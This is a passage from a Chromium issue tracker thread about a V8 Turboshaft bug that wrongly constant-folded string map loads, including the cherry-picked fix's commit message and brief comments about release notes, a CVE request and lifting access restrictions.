As per the metadata change after [comment #60](https://issues.chromium.org/issues/41491373#comment60), it looks like this was tagged for the Release-1-M121 with a release-notes update being needed.
This means that is in the queue for the person responsible and this issue will be picked up in the next sweep in the next forthcoming weeks.

### ap...@google.com (2024-03-13)

Project: v8/v8
Branch: refs/branch-heads/12.0

commit 3c44945bb8c7458f192456add50359d834011f29
Author: Zakhar Voit <voit@google.com>
Date:   Wed Mar 13 12:15:06 2024

    [M120-LTS][turboshaft] Fix wrong constant folding of strings map loads
    
    is_stable should only be used on non-primitive maps. Strings can
    change maps despite their maps being "stable".
    
    (cherry picked from commit afc18842029d5629fccda99485c0dc44a71fb3c5)
    
    Bug: chromium:1518396
    Change-Id: I3bcb33223f6d08df30d97da6eca2b06efb052960
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5217051
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org>
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#91942}
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5320119
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
    Commit-Queue: Zakhar Voit <voit@google.com>
    Cr-Commit-Position: refs/branch-heads/12.0@{#38}
    Cr-Branched-From: ed7b4caf1fb8184ad9e24346c84424055d4d430a-refs/heads/12.0.267@{#1}
    Cr-Branched-From: 210e75b19db4352c9b78dce0bae11c2dc3077df4-refs/heads/main@{#90651}

M       src/compiler/turboshaft/machine-optimization-reducer.h
A       test/mjsunit/compiler/regress-crbug-1518396.js

https://chromium-review.googlesource.com/5320119


### ki...@gmail.com (2024-03-28)

Hi, please let me know when the CVE of this vulnerability will be updated, thanks!

### pe...@google.com (2024-04-30)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/41491373)*
